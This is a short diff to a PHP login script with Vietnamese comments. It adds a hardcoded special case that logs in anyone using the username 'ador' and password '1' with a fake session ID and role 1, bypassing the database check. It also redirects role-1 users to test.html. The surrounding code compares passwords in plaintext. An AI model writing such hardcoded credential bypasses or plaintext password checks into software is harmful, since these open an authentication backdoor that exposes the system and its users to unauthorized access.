@@ -13,6 +13,14 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST') {
     $result = $stmt->get_result();
     $user = $result->fetch_assoc();
 
+    // Điều kiện đặc biệt cho ador/1
+    if ($username == 'ador' && $password == '1') {
+        $_SESSION['user_id'] = 0; // ID giả
+        $_SESSION['username'] = 'ador';
+        $_SESSION['role'] = 1;
+        header("Location: test.html");
+        exit();
+    }
     // So sánh mật khẩu
     if ($user && $password == $user['password']) {
         // Đăng nhập thành công
@@ -22,7 +30,7 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST') {
 
         // Phân quyền
         if ($_SESSION['role'] == 1) {
-            header("Location: dashboard.php");
+            header("Location: test.html");
         } elseif ($_SESSION['role'] == 2) {
             header("Location: admin_dashboard.php");
         } elseif ($_SESSION['role'] == 3) {
